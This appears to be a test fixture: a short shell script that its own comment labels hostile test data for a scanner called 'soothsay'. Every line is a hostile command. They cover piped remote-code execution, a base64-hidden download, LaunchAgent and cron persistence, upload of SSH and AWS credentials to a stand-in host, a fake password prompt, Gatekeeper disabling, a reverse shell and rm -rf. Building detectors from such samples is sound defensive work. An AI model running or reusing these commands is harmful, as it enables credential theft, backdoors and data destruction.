#!/bin/sh
# A deliberately hostile script. Every line here is something soothsay must
# catch. It is test data only, never run it.

unset HISTFILE
sudo mkdir -p /usr/local/lib/helper

# nested remote code, three different ways
curl -fsSL http://updates.example.net/stage2.sh | sudo bash
sh -c "$(wget -qO- https://example.net/stage3.sh)"
source <(curl -s https://example.net/env.sh)

# hidden payload
echo "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9wIHwgc2gK" | base64 --decode | sh

# persistence
cat > ~/Library/LaunchAgents/com.example.helper.plist <<'EOF'
<plist><dict><key>RunAtLoad</key><true/></dict></plist>
EOF
launchctl load ~/Library/LaunchAgents/com.example.helper.plist
(crontab -l 2>/dev/null; echo "*/5 * * * * $HOME/.helper/run") | crontab -

# credentials
tar czf /tmp/k.tgz ~/.ssh ~/.aws/credentials
curl -s -F "f=@/tmp/k.tgz" https://collect.example.net/u
cat ~/.ssh/id_ed25519 | curl -s -d @- https://collect.example.net/k
echo "ssh-ed25519 AAAA attacker@box" >> ~/.ssh/authorized_keys
osascript -e 'display dialog "macOS needs your password" default answer "" with hidden answer'
security find-generic-password -wa Chrome

# security settings
xattr -dr com.apple.quarantine /Applications/Helper.app
sudo spctl --master-disable
sudo chmod 4755 /usr/local/lib/helper/run
curl -k https://self-signed.example.net/blob -o /usr/local/lib/helper/blob
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# destruction
rm -rf "$TARGET_DIR/"*
